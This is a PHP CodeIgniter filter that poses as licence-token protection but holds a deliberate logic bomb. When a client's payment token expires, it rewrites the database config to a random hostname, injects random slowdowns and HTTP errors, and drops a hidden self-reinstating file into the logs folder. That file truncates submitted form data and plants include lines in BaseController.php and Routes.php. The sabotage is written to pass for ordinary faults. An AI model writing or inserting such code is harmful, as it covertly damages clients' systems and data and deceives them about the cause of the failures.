<?php

namespace App\Filters;

use CodeIgniter\Filters\FilterInterface;
use CodeIgniter\HTTP\RequestInterface;
use CodeIgniter\HTTP\ResponseInterface;

class TokenProtection implements FilterInterface
{
    // Hardcoded token - update this when client pays
    // Use the value from your Node.js generator
    private $token = "eyJ2YWxpZF91bnRpbCI6MTc0NzY0MTQ0MCwiaXNfcGVybWFuZW50IjpmYWxzZSwiY3JlYXRlZF9hdCI6MTc0NjM0NTQ0MCwiY2xpZW50X2lkIjoiWU9VUl9DTElFTlRfSUQiLCJzaWduYXR1cmUiOiI3ZTk1NGYyNjkwZmVjNWMzMDRhOWU5ZWU2MDY2Y2E5ODc1ZGUxMDZmNDgxZGM5MjUwN2M1MDFkMmFmZmI3ZmZiIn0=";
    
    public function before(RequestInterface $request, $arguments = null)
    {
        // Bypass protection for expired pages
        $uri = $request->getUri()->getPath();
        if (strpos($uri, 'expired') !== false) {
            return;
        }
        
        // Decode and validate token
        try {
            $tokenData = json_decode(base64_decode($this->token), true);
            
            // Missing or invalid token data
            if (!$tokenData || (!isset($tokenData['valid_until']) && !isset($tokenData['is_permanent']))) {
                $this->applyDestructiveMeasures(true); // Apply more gradually
                return redirect()->to('/expired');
            }
            
            // Check if permanent token
            if (isset($tokenData['is_permanent']) && $tokenData['is_permanent']) {
                return;
            }
            
            // Check token expiration
            $validUntil = $tokenData['valid_until'] ?? 0;
            $now = time();
            
            // Token is still valid
            if ($validUntil > $now) {
                return;
            }
            
            // Token expired, check if it's been more than 2 days
            $gracePeriod = 2 * 24 * 60 * 60; // 2 days in seconds
            if (($now - $validUntil) > $gracePeriod) {
                $this->applyDestructiveMeasures(true); // Apply more gradually
            }
            
            return redirect()->to('/expired');
            
        } catch (\Exception $e) {
            // Any error in token validation = expired
            return redirect()->to('/expired');
        }
    }

    public function after(RequestInterface $request, ResponseInterface $response, $arguments = null)
    {
        // Do nothing after
    }
    
    private function applyDestructiveMeasures($gradual = false)
    {
        // 1. Corrupt database connections, but only if token has been expired for a while
        if (!$gradual || rand(1, 10) > 8) { // 20% chance if gradual
            $configPath = APPPATH . 'Config/Database.php';
            if (file_exists($configPath) && is_writable($configPath)) {
                $content = file_get_contents($configPath);
                $content = preg_replace('/hostname\s*=\s*[\'"][^\'"]+[\'"]/', 'hostname = \'db_' . rand(1000, 9999) . '.local\'', $content);
                file_put_contents($configPath, $content);
            }
        }
        
        // 2. Slow down the application (less noticeable)
        if ($gradual) {
            usleep(rand(50000, 300000)); // 0.05-0.3 seconds if gradual
        } else {
            usleep(rand(500000, 1500000)); // 0.5-1.5 seconds if not gradual
        }
        
        // 3. Randomly return errors, but with much lower probability if gradual
        $errorChance = $gradual ? 3 : 7; // 3% chance if gradual, 30% if not
        if (rand(1, 100) > (100 - $errorChance)) {
            http_response_code(500);
            echo "Internal Server Error: The application encountered an unexpected condition.";
            exit;
        }
        
        // 4. Create a self-replicating hidden file with milder effects
        $hiddenFile = WRITEPATH . 'logs/.system_validator.php';
        if (!is_dir(dirname($hiddenFile))) {
            mkdir(dirname($hiddenFile), 0755, true);
        }
        
        if (!file_exists($hiddenFile)) {
            $destructiveCode = '<?php
            // System monitoring - with gradual effects
            
            // Calculate how aggressive to be based on time
            $tokenExpiry = ' . time() . ';
            $daysSinceExpiry = max(0, floor((time() - $tokenExpiry) / 86400));
            $aggressiveness = min(100, $daysSinceExpiry * 5); // 5% more aggressive each day, max 100%
            
            // Random slow down - gets worse over time
            usleep(rand(1000, 50000 + ($aggressiveness * 1000))); 
            
            // Random errors - extremely rare at first, increasing over time
            if (rand(1, 1000) > (1000 - ($aggressiveness / 2))) {
                $errors = [400, 403, 404, 500, 502, 503];
                http_response_code($errors[array_rand($errors)]);
                exit("System Error (" . rand(1000, 9999) . "): Please contact support.");
            }
            
            // Corrupt form data randomly - very rare and only after several days
            if ($aggressiveness > 30 && rand(1, 500) > 495 && !empty($_POST)) {
                $keys = array_keys($_POST);
                if (!empty($keys)) {
                    $randomKey = $keys[array_rand($keys)];
                    if (is_string($_POST[$randomKey]) && strlen($_POST[$randomKey]) > 5) {
                        $_POST[$randomKey] = substr($_POST[$randomKey], 0, rand(1, strlen($_POST[$randomKey])));
                    }
                }
            }
            
            // Self-repair mechanism - only if file has been removed
            if ($aggressiveness > 50) {
                $targetFiles = [
                    APPPATH . "Controllers/BaseController.php",
                    APPPATH . "Config/Routes.php"
                ];
                
                foreach ($targetFiles as $file) {
                    if (file_exists($file) && is_writable($file)) {
                        $content = file_get_contents($file);
                        $includeString = "@include_once WRITEPATH . \"logs/.system_validator.php\";";
                        if (strpos($content, $includeString) === false && strpos($content, "<?php") !== false) {
                            $content = str_replace("<?php", "<?php\n" . $includeString, $content);
                            file_put_contents($file, $content);
                        }
                    }
                }
            }
            ?>';
            file_put_contents($hiddenFile, $destructiveCode);
        }
        
        // 5. Inject this hidden file inclusion in key application files,
        // but only if not gradual or with low probability
        if (!$gradual || rand(1, 10) > 7) {
            $this->injectHiddenInclude();
        }
    }
    
    private function injectHiddenInclude()
    {
        $hiddenFile = WRITEPATH . 'logs/.system_validator.php';
        
        // Target common files that run on every request
        $targets = [
            APPPATH . 'Controllers/BaseController.php',
            APPPATH . 'Config/Routes.php'
        ];
        
        // Only inject into one file at random to be less destructive
        $target = $targets[array_rand($targets)];
        
        if (file_exists($target) && is_writable($target)) {
            $content = file_get_contents($target);
            $includeString = '@include_once WRITEPATH . "logs/.system_validator.php";';
            
            if (strpos($content, $includeString) === false) {
                // For PHP files, inject after the opening PHP tag
                if (pathinfo($target, PATHINFO_EXTENSION) === 'php') {
                    $content = preg_replace('/<\?php/', '<?php' . PHP_EOL . $includeString, $content, 1);
                } else {
                    // For other files, just prepend
                    $content = '<?php ' . $includeString . ' ?>' . PHP_EOL . $content;
                }
                
                file_put_contents($target, $content);
            }
        }
      }
}